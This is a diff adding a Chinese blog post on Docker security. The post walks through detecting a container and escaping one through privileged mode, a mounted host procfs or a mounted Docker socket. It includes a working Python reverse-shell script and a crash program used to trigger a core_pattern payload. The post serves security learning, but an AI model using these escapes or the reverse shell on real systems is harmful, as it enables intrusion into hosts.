@@ -1,0 +1,832 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="liuty">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Docker介绍Docker是一种轻量级的虚拟化技术，同时是一个开源的应用容器运行环境搭建平台，可以让开发者以便捷方式打包应用到一个可移植的容器中，然后安装至任何运行Linux或Windows等系统的服务器上。相较于传统虚拟机，Docker容器提供轻量化的虚拟化方式、安装便捷、启停速度快 Docker容器具有以下三大特点：轻量化：一台主机上运行的多个Docker容器可以共享主机操作系统内核；启动迅">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Docker安全（一）">
+<meta property="og:url" content="http://example.com/2024/02/13/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/index.html">
+<meta property="og:site_name" content="liuty&#39;s blog">
+<meta property="og:description" content="Docker介绍Docker是一种轻量级的虚拟化技术，同时是一个开源的应用容器运行环境搭建平台，可以让开发者以便捷方式打包应用到一个可移植的容器中，然后安装至任何运行Linux或Windows等系统的服务器上。相较于传统虚拟机，Docker容器提供轻量化的虚拟化方式、安装便捷、启停速度快 Docker容器具有以下三大特点：轻量化：一台主机上运行的多个Docker容器可以共享主机操作系统内核；启动迅">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2024/02/13/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/download.png">
+<meta property="og:image" content="http://example.com/2024/02/13/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/2024-02-12_21-20.png">
+<meta property="og:image" content="http://example.com/2024/02/13/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/2024-02-12_21-23.png">
+<meta property="og:image" content="http://example.com/2024/02/13/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/2024-02-12_21-23_1.png">
+<meta property="og:image" content="http://example.com/2024/02/13/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/2024-02-12_21-27.png">
+<meta property="og:image" content="http://example.com/2024/02/13/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/2024-02-13_14-49.png">
+<meta property="og:image" content="http://example.com/2024/02/13/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/2024-02-13_14-57.png">
+<meta property="og:image" content="http://example.com/2024/02/13/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/2024-02-13_14-57_1.png">
+<meta property="og:image" content="http://example.com/2024/02/13/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/561614e85933b4d01a5dbf10d2715922.png">
+<meta property="og:image" content="http://example.com/2024/02/13/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/2024-02-13_15-18.png">
+<meta property="og:image" content="http://example.com/2024/02/13/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/2024-02-13_15-19.png">
+<meta property="og:image" content="http://example.com/2024/02/13/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/2024-02-13_16-53.png">
+<meta property="og:image" content="http://example.com/2024/02/13/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/2024-02-13_16-58_1.png">
+<meta property="og:image" content="http://example.com/2024/02/13/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/2024-02-13_17-21.png">
+<meta property="og:image" content="http://example.com/2024/02/13/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/2024-02-13_15-00.png">
+<meta property="og:image" content="http://example.com/2024/02/13/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/2024-02-13_15-03.png">
+<meta property="og:image" content="http://example.com/2024/02/13/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/2024-02-13_15-07.png">
+<meta property="og:image" content="http://example.com/2024/02/13/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/2024-02-13_15-09.png">
+<meta property="article:published_time" content="2024-02-13T13:07:44.000Z">
+<meta property="article:modified_time" content="2024-02-13T15:00:53.397Z">
+<meta property="article:author" content="liuty">
+<meta property="article:tag" content="漏洞总结">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2024/02/13/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/download.png">
+  
+  
+  
+  <title>Docker安全（一） - liuty&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"hCaWnJI7fVuWUvqb3FgzqfKD-gzGzoHsz","app_key":"NJZ1v4tGwTre1rcW3Qdw1WYU","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>liuty&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Docker安全（一）"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-02-13 21:07" pubdate>
+          2024年2月13日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.4k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          20 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Docker安全（一）</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="Docker介绍"><a href="#Docker介绍" class="headerlink" title="Docker介绍"></a>Docker介绍</h2><p>Docker是一种轻量级的虚拟化技术，同时是一个开源的应用容器运行环境搭建平台，可以让开发者以便捷方式打包应用到一个可移植的容器中，然后安装至任何运行Linux或Windows等系统的服务器上。相较于传统虚拟机，Docker容器提供轻量化的虚拟化方式、安装便捷、启停速度快</p>
+<p>Docker容器具有以下三大特点：<br>轻量化：一台主机上运行的多个Docker容器可以共享主机操作系统内核；启动迅速，只需占用很少的计算和内存资源<br>标准开放：Docker容器基于开放式标准，能够在所有主流Linux版本、Microsoft Windows以及包括VM、裸机服务器和云在内的任何基础设施上运行<br>安全可靠：Docker赋予应用的隔离性不仅限于彼此隔离，还独立于底层的基础设施。Docker默认提供最强的隔离，因此应用出现问题，也只是单个容器的问题，而不会波及到整台主机</p>
+<p>Docker容器的运行逻辑如下图所示，Docker使用客户端&#x2F;服务器 (C&#x2F;S) 架构模式，Docker守护进程（Docker daemon）作为Server端接收Docker客户端的请求，并负责创建、运行和分发Docker容器。Docker守护进程一般在Docker主机后台运行，用户使用Docker客户端直接跟Docker守护进程进行信息交互</p>
+<img src="/2024/02/13/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/download.png" srcset="/img/loading.gif" lazyload class="" title="download.png">
+<h6 id=""><a href="#" class="headerlink" title=""></a></h6><h2 id="Docker安全机制"><a href="#Docker安全机制" class="headerlink" title="Docker安全机制"></a>Docker安全机制</h2><p>提到Docker安全，就不得不说以下名词：</p>
+<p>Namespace–&gt;内核命名空间<br>Linux的namespace是一种内核特性，可以将系统资源进行隔离，每个隔离的部分被称为一个namespace。通过使用namespace，可以将不同进程之间的资源进行隔离，使得它们感觉像是在独立的环境中运行。用简洁明了的话来说,namespace实现了容器与容器,容器与宿主机之间的隔离，而业内广为人知的privileged特权逃逸的本质也是因为特权环境打破了容器与宿主机直接的隔离实现了容器逃逸</p>
+<p>Cgroups–&gt;控制组<br>Cgroups本质上是在内核中附加的一系列钩子（hook），当程序运行时，内核会根据程序对资源的请求触发相应的钩子，以达到资源追踪和限制的目的。在Linux系统中，Cgroups对于系统资源的管理和控制非常重要，可以帮助管理员更加精细化地控制资源的分配和使用，Cgroups主要实现了对容器资源的分配,限制和管理</p>
+<p>Capabilities<br>Capabilities是Linux一种安全机制,在linux内核2.2之后引入,用于对权限更细致的控制</p>
+<p>参考文章：<br><a target="_blank" rel="noopener" href="https://info.support.huawei.com/info-finder/encyclopedia/zh/Docker%E5%AE%B9%E5%99%A8.html">https://info.support.huawei.com/info-finder/encyclopedia/zh/Docker%E5%AE%B9%E5%99%A8.html</a><br><a target="_blank" rel="noopener" href="https://www.hacking8.com/MiscSecNotes/23.html">https://www.hacking8.com/MiscSecNotes/23.html</a></p>
+<h2 id="Docker常用渗透测试点"><a href="#Docker常用渗透测试点" class="headerlink" title="Docker常用渗透测试点"></a>Docker常用渗透测试点</h2><h3 id="前渗透——容器判断与信息收集"><a href="#前渗透——容器判断与信息收集" class="headerlink" title="前渗透——容器判断与信息收集"></a>前渗透——容器判断与信息收集</h3><p>当我们拿到了一个shell,首先要判断的是当前环境是否为容器环境，我们可以通过以下方式进行判断</p>
+<p>1、查询cgroup信息<br>当在容器中运行进程时，每个进程会被分配到一个或多个 cgroup 中，cgroup 可以对进程的资源使用进行控制和限制，而&#x2F;proc&#x2F;1&#x2F;cgroup文件记录了进程的控制组信息</p>
+<img src="/2024/02/13/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/2024-02-12_21-20.png" srcset="/img/loading.gif" lazyload class="" title="2024-02-12_21-20.png">
+<h6 id="-1"><a href="#-1" class="headerlink" title=""></a></h6><p>通过上图可知，我们通过判断cat &#x2F;proc&#x2F;1&#x2F;cgroup的输出内容是否有docker来判断是否是容器内的环境，所以我们可以稍微修改一下上述查询的语句</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /proc/1/cgroup | grep -qi docker &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;In Docker&quot;</span> || <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Not Docker&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>2、查看硬盘信息<br>容器输出为空，非容器有内容输出。值得注意的是:Privileged 特权模式下也是可以查看到内容的</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">fdisk -l</span><br></code></pre></td></tr></table></figure>
+<p>容器内环境:</p>
+<img src="/2024/02/13/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/2024-02-12_21-23.png" srcset="/img/loading.gif" lazyload class="" title="2024-02-12_21-23.png">
+<h6 id="-2"><a href="#-2" class="headerlink" title=""></a></h6><p>3、查询.dockerenv文件<br>.dockerenv文件是Docker守护进程的配置文件，它包含了Docker守护进程的运行参数和配置信息。这个文件通常用于配置Docker守护进程的行为，例如容器的网络设置、存储驱动、卷管理等。.dockerenv文件是一个文本文件，其中包含了一些环境变量，这些环境变量描述了Docker守护进程的状态和配置。这个文件通常由Docker守护进程的配置脚本生成，并保存在Docker守护进程的数据目录中。简单来说只有在docker环境下才有这个文件，所以可以通过检查是否有.dockerenv文件，来进行判断是否在docker环境中</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">ls</span> -alh / |grep <span class="hljs-string">.dockerenv</span><br></code></pre></td></tr></table></figure>
+
+<img src="/2024/02/13/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/2024-02-12_21-23_1.png" srcset="/img/loading.gif" lazyload class="" title="2024-02-12_21-23_1.png">
+<h6 id="-3"><a href="#-3" class="headerlink" title=""></a></h6><p>4、检查mount信息+挂载点</p>
+<img src="/2024/02/13/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/2024-02-12_21-27.png" srcset="/img/loading.gif" lazyload class="" title="2024-02-12_21-27.png">
+<h6 id="-4"><a href="#-4" class="headerlink" title=""></a></h6><h3 id="后渗透-常见docker逃逸"><a href="#后渗透-常见docker逃逸" class="headerlink" title="后渗透-常见docker逃逸"></a>后渗透-常见docker逃逸</h3><p>容器逃逸的实质是从Cgroup&#x2F;Namespace 限制权限的进程获取更多权限，常见的docker逃逸方式：<br>1、Priviliged 特权模式逃逸<br>2、挂载宿主机 procfs 逃逸<br>3、挂载 Docker Socket 逃逸</p>
+<p>为了方便演示，在根目录下面创建一个flag.txt，如果在创建的镜像当中看到这个flag，证明逃逸成功</p>
+<img src="/2024/02/13/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/2024-02-13_14-49.png" srcset="/img/loading.gif" lazyload class="" title="2024-02-13_14-49.png">
+<h6 id="-5"><a href="#-5" class="headerlink" title=""></a></h6><h4 id="Priviliged-特权模式逃逸"><a href="#Priviliged-特权模式逃逸" class="headerlink" title="Priviliged 特权模式逃逸"></a>Priviliged 特权模式逃逸</h4><p>如何判断当前容器是以Privileged 特权模式启动的呢?</p>
+<p>这里提供两种方式：<br>1、我们可以使用 fdisk -l 查看宿主机的磁盘设备，如果不在 privileged 容器内部，是没有权限查看磁盘列表并操作挂载的<br>2、除此之外我们可以通过查看CapEff的掩码值来判断容器是不是特权模式，如果是以特权模式启动的话，CapEff 对应的掩码值应该为0000003fffffffff 或者是 0000001fffffffff</p>
+<img src="/2024/02/13/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/2024-02-13_14-57.png" srcset="/img/loading.gif" lazyload class="" title="2024-02-13_14-57.png">
+<h6 id="-6"><a href="#-6" class="headerlink" title=""></a></h6><p>尝试使用文件挂载进行逃逸，然后我们再通过 cat 去查看被挂载的文件夹，如果可以成功看到宿主机的内容，说明逃逸成功</p>
+<img src="/2024/02/13/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/2024-02-13_14-57_1.png" srcset="/img/loading.gif" lazyload class="" title="2024-02-13_14-57_1.png">
+<h6 id="-7"><a href="#-7" class="headerlink" title=""></a></h6><p>从对抗的层面上，不建议将逃逸的行为当成可以写入宿主机特定文件 (如 &#x2F;etc&#x2F;cron*, &#x2F;root&#x2F;.ssh&#x2F;authorized_keys 等文件) 的行为，应该根据目标选择更趋近与业务行为的手法</p>
+<h4 id="挂载宿主机-procfs-逃逸"><a href="#挂载宿主机-procfs-逃逸" class="headerlink" title="挂载宿主机 procfs 逃逸"></a>挂载宿主机 procfs 逃逸</h4><p>挂载宿主机 procfs 逃逸,其本质上因为宿主机挂载了procfs,导致我们可以像宿主机内写入一段恶意的payload,比如反弹shell,然后利用代码制造崩溃,触发内存转储,就会执行我们恶意的payload</p>
+<p>Procfs 是进程文件系统的缩写，包含一个伪文件系统（启动时动态生成的文件系统），用于通过内核访问进程信息。linux这个文件系统通常被挂载到 &#x2F;proc 目录。由于 &#x2F;proc 不是一个真正的文件系统(概念参考本文2.1.12节)，它也就不占用存储空间，只是占用有限的内存。&#x2F;proc中的文件可以被修改，但一般不可以被删除</p>
+<img src="/2024/02/13/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/561614e85933b4d01a5dbf10d2715922.png" srcset="/img/loading.gif" lazyload class="" title="561614e85933b4d01a5dbf10d2715922.png">
+<h6 id="-8"><a href="#-8" class="headerlink" title=""></a></h6><p>如果返回了两个 core_pattern 文件，那么很可能就是挂载了宿主机的 procfs</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">find</span> / -name core_pattern<br></code></pre></td></tr></table></figure>
+<p>core_pattern（核心转储模式）是Linux系统中的一个配置参数，用于定义在程序崩溃时生成核心转储文件的方式和位置。当一个程序发生崩溃（如段错误）时，操作系统会生成一个包含程序崩溃状态的核心转储文件，以便进行调试和故障排除</p>
+<img src="/2024/02/13/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/2024-02-13_15-18.png" srcset="/img/loading.gif" lazyload class="" title="2024-02-13_15-18.png">
+<h6 id="-9"><a href="#-9" class="headerlink" title=""></a></h6><p>接下来我们需要找到docker在当前宿主机的绝对路径</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /proc/mounts | xargs -d <span class="hljs-string">&#x27;,&#x27;</span> -n 1 | grep workdir<br></code></pre></td></tr></table></figure>
+
+<img src="/2024/02/13/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/2024-02-13_15-19.png" srcset="/img/loading.gif" lazyload class="" title="2024-02-13_15-19.png">
+<h6 id="-10"><a href="#-10" class="headerlink" title=""></a></h6><p>可以看出,当前的绝对路径为：&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;*****************&#x2F;merged（去除work换成merged）<br>接下来我们需要准备一个反弹shell的脚本以及一个可以制造崩溃,触发内存转储的代码<br>反弹shell脚本：</p>
+<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">#!/usr/bin/python3<br><span class="hljs-keyword">import</span>  <span class="hljs-built_in">os</span><br><span class="hljs-keyword">import</span> pty<br><span class="hljs-keyword">import</span> socket<br>lhost = <span class="hljs-string">&quot;127.0.0.1&quot;</span><br>lport = <span class="hljs-number">0000</span><br>def main():<br>   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>   s.connect((lhost, lport))<br>   <span class="hljs-built_in">os</span>.dup2(s.fileno(), <span class="hljs-number">0</span>)<br>   <span class="hljs-built_in">os</span>.dup2(s.fileno(), <span class="hljs-number">1</span>)<br>   <span class="hljs-built_in">os</span>.dup2(s.fileno(), <span class="hljs-number">2</span>)<br>   <span class="hljs-built_in">os</span>.putenv(<span class="hljs-string">&quot;HISTFILE&quot;</span>, <span class="hljs-string">&#x27;/dev/null&#x27;</span>)<br>   pty.spawn(<span class="hljs-string">&quot;/bin/bash&quot;</span>)<br>   # <span class="hljs-built_in">os</span>.remove(<span class="hljs-string">&#x27;/tmp/.ning.py&#x27;</span>)<br>   s.close()<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>   main()<br></code></pre></td></tr></table></figure>
+<p>（注意：如果vim被禁用或者因为别的原因用不了，可以用cat+EOF代替）</p>
+<img src="/2024/02/13/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/2024-02-13_16-53.png" srcset="/img/loading.gif" lazyload class="" title="2024-02-13_16-53.png">
+<h6 id="-11"><a href="#-11" class="headerlink" title=""></a></h6><p>接下来赋权并且将该脚本写到目标的 proc 目录下</p>
+<img src="/2024/02/13/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/2024-02-13_16-58_1.png" srcset="/img/loading.gif" lazyload class="" title="2024-02-13_16-58_1.png">
+<h6 id="-12"><a href="#-12" class="headerlink" title=""></a></h6><p>然后我们用c写一个可以触发崩溃的程序</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>  </span>&#123;<br>   <span class="hljs-type">int</span> *a  = <span class="hljs-literal">NULL</span>;<br>   *a = <span class="hljs-number">1</span>;<br>   <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>随后进行编译并赋权限，紧接着我们在攻击机上起监听，于此同时,我们在容器内运行编译好的程序</p>
+<img src="/2024/02/13/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/2024-02-13_17-21.png" srcset="/img/loading.gif" lazyload class="" title="2024-02-13_17-21.png">
+<h6 id="-13"><a href="#-13" class="headerlink" title=""></a></h6><p>成功反弹shell,并拿到flag<br>逃逸Success!</p>
+<h4 id="挂载-Docker-Socket-逃逸"><a href="#挂载-Docker-Socket-逃逸" class="headerlink" title="挂载 Docker Socket 逃逸"></a>挂载 Docker Socket 逃逸</h4><p>Docker Socket 是Docker引擎的UNIX套接字文件，用于与Docker守护进程进行通信。Docker守护进程是Docker引擎的核心组件，负责管理和执行容器。Docker Socket允许用户通过基于RESTful API的请求与Docker守护进程进行通信，以便执行各种操作，例如创建、运行和停止容器，构建和推送镜像，查看和管理容器的日志等</p>
+<p>判断当前容器是否挂载Docker Socket,如果存在文件则说明Docker Socket被挂载,就可以尝试逃逸</p>
+<img src="/2024/02/13/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/2024-02-13_15-00.png" srcset="/img/loading.gif" lazyload class="" title="2024-02-13_15-00.png">
+<h6 id="-14"><a href="#-14" class="headerlink" title=""></a></h6><p>我们可以在容器内部创建一个新的容器，因为Docker Socket被挂载到了当前容器,所有我们可以将宿主机目录挂载到新的容器内部</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs vim">apt-<span class="hljs-built_in">get</span> <span class="hljs-keyword">update</span><br><br>apt-<span class="hljs-built_in">get</span> install curl<br><br>curl -fsSL https://<span class="hljs-built_in">get</span>.docker.<span class="hljs-keyword">com</span>/ | <span class="hljs-keyword">sh</span><br><br>apt-<span class="hljs-built_in">get</span> <span class="hljs-keyword">update</span> &amp;&amp; apt-<span class="hljs-built_in">get</span> install curl &amp;&amp; curl -fsSL https://<span class="hljs-built_in">get</span>.docker.<span class="hljs-keyword">com</span>/ | <span class="hljs-keyword">sh</span><br></code></pre></td></tr></table></figure>
+
+<img src="/2024/02/13/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/2024-02-13_15-03.png" srcset="/img/loading.gif" lazyload class="" title="2024-02-13_15-03.png">
+<h6 id="-15"><a href="#-15" class="headerlink" title=""></a></h6><img src="/2024/02/13/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/2024-02-13_15-07.png" srcset="/img/loading.gif" lazyload class="" title="2024-02-13_15-07.png">
+<h6 id="-16"><a href="#-16" class="headerlink" title=""></a></h6><p>接下来，在容器内部创建一个新的容器，并将宿主机目录挂载到新的容器内部即可</p>
